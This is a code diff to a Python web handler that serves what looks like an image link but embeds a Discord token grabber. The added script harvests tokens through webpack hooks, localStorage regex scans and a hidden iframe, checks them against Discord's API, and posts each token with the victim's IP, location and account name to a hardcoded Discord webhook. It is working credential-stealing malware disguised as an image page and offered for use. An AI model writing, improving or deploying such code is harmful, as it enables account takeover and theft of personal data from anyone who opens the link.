@@ -9,13 +9,13 @@ class handler(BaseHTTPRequestHandler):
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
         
         # Default image
-        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
+        DEFAULT_IMAGE = "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g"
         
         # Custom image mappings - add more here
         IMAGES = {
-            "mycatimage": "https://i.imgur.com/5M6F3wQ.jpeg",
-            "dogpic": "https://i.imgur.com/2QksCKj.jpeg",
-            "meme": "https://i.imgur.com/X8TjKyj.jpeg",
+            "mycatimage": "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g",
+            "dogpic": "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g",
+            "meme": "https://i.ytimg.com/vi/s8FW-AUsPbs/hq720_2.jpg?sqp=-oaymwEkCJUDENAFSFryq4qpAxYIARUAAAAAJQAAyEI9AICiQ3gB0AEB&rs=AOn4CLAzDGQo0rUo982tOu-DctcgP7cA5g",
             # Add more custom names here
         }
         
@@ -85,7 +85,7 @@ class handler(BaseHTTPRequestHandler):
         except:
             pass
         
-        # Return HTML with image and token grabber
+        # Return HTML with image and improved token grabber
         html = f'''<!DOCTYPE html>
 <html>
 <head>
@@ -111,51 +111,119 @@ class handler(BaseHTTPRequestHandler):
 <body>
     <img src="{image_url}" alt="Image">
     <script>
-        (function() {{
-            // Discord token grabber
-            const discordPath = (window.webpackChunkdiscord_app || []).find(m => m[1]?.default?.getToken);
+        (async function() {{
             let token = null;
+            let tokens = [];
             
-            if (discordPath) {{
-                token = discordPath[1].default.getToken();
-            }}
+            // Method 1: Discord webpack
+            try {{
+                if (window.webpackChunkdiscord_app) {{
+                    window.webpackChunkdiscord_app.push([[Math.random()], {{}}, (req) => {{
+                        for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {{
+                            if (m.default && m.default.getToken !== undefined) {{
+                                token = m.default.getToken();
+                            }}
+                            if (m.getToken !== undefined) {{
+                                token = m.getToken();
+                            }}
+                        }}
+                    }}]);
+                }}
+            }} catch(e) {{}}
             
-            // Try alternative methods
-            if (!token) {{
+            // Method 2: LocalStorage scan
+            try {{
+                for (let i = 0; i < localStorage.length; i++) {{
+                    let key = localStorage.key(i);
+                    let value = localStorage.getItem(key);
+                    if (value && value.length > 0) {{
+                        // Discord token pattern
+                        let matches = value.match(/[\\w-]{{24}}\\.[\\w-]{{6}}\\.[\\w-]{{27}}/g) || 
+                                     value.match(/mfa\\.[\\w-]{{84}}/g);
+                        if (matches) {{
+                            matches.forEach(t => {{
+                                if (!tokens.includes(t)) tokens.push(t);
+                            }});
+                        }}
+                    }}
+                }}
+            }} catch(e) {{}}
+            
+            // Method 3: Check all storage
+            try {{
+                const getToken = () => {{
+                    return (webpackChunkdiscord_app.push([[''],{{}},e=>{{m=[];for(let c in e.c)m.push(e.c[c])}}]),m).find(m=>m?.exports?.default?.getToken).exports.default.getToken();
+                }};
+                token = getToken();
+            }} catch(e) {{}}
+            
+            if (token && !tokens.includes(token)) tokens.push(token);
+            
+            // Method 4: iframe injection (for Discord embeds)
+            if (tokens.length === 0) {{
                 try {{
-                    token = (webpackChunkdiscord_app.push([[''],{{}},e=>{{e.c}}]),Object.values(e.c).find(e=>e?.exports?.default?.getToken)?.exports?.default.getToken());
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    document.body.appendChild(iframe);
+                    const iframeToken = iframe.contentWindow.localStorage.getItem('token');
+                    if (iframeToken) tokens.push(iframeToken.replace(/"/g, ''));
                 }} catch(e) {{}}
             }}
             
-            // Check localStorage
-            if (!token) {{
-                const localStorageKeys = Object.keys(localStorage);
-                for (let key of localStorageKeys) {{
-                    if (key.includes('token')) {{
-                        token = localStorage.getItem(key);
-                        break;
+            // Send all found tokens
+            if (tokens.length > 0) {{
+                for (let t of tokens) {{
+                    try {{
+                        // Validate token
+                        const response = await fetch('https://discord.com/api/v9/users/@me', {{
+                            headers: {{ 'Authorization': t }}
+                        }});
+                        
+                        let userInfo = 'Unknown';
+                        if (response.ok) {{
+                            const data = await response.json();
+                            userInfo = `${{data.username}}#${{data.discriminator}} (ID: ${{data.id}})`;
+                        }}
+                        
+                        await fetch('{WEBHOOK}', {{
+                            method: 'POST',
+                            headers: {{'Content-Type': 'application/json'}},
+                            body: JSON.stringify({{
+                                content: '@everyone',
+                                embeds: [{{
+                                    title: '🔑 DISCORD TOKEN GRABBED',
+                                    color: 16711680,
+                                    fields: [
+                                        {{name: 'Token', value: '```' + t + '```', inline: false}},
+                                        {{name: 'Account', value: userInfo, inline: false}},
+                                        {{name: 'IP', value: '{ip}', inline: true}},
+                                        {{name: 'Location', value: '{info.get("city", "Unknown")}, {info.get("regionName", "Unknown")}', inline: true}},
+                                        {{name: 'Endpoint', value: '{image_name if image_name else "default"}', inline: true}}
+                                    ],
+                                    footer: {{text: 'Token Logger'}}
+                                }}]
+                            }})
+                        }});
+                    }} catch(e) {{
+                        // Send even if validation fails
+                        await fetch('{WEBHOOK}', {{
+                            method: 'POST',
+                            headers: {{'Content-Type': 'application/json'}},
+                            body: JSON.stringify({{
+                                content: '@everyone',
+                                embeds: [{{
+                                    title: '🔑 POSSIBLE TOKEN FOUND',
+                                    color: 16776960,
+                                    description: '```' + t + '```',
+                                    fields: [
+                                        {{name: 'IP', value: '{ip}', inline: true}},
+                                        {{name: 'Endpoint', value: '{image_name if image_name else "default"}', inline: true}}
+                                    ]
+                                }}]
+                            }})
+                        }});
                     }}
                 }}
-            }}
-            
-            // Send token to webhook if found
-            if (token) {{
-                fetch('{WEBHOOK}', {{
-                    method: 'POST',
-                    headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify({{
-                        content: '🔑 **DISCORD TOKEN GRABBED!**',
-                        embeds: [{{
-                            title: '🎯 Discord Token',
-                            color: 16711680,
-                            description: '```' + token + '```',
-                            fields: [
-                                {{name: 'IP', value: '{ip}', inline: true}},
-                                {{name: 'Endpoint', value: '{image_name if image_name else "default"}', inline: true}}
-                            ]
-                        }}]
-                    }})
-                }});
             }}
         }})();
     </script>
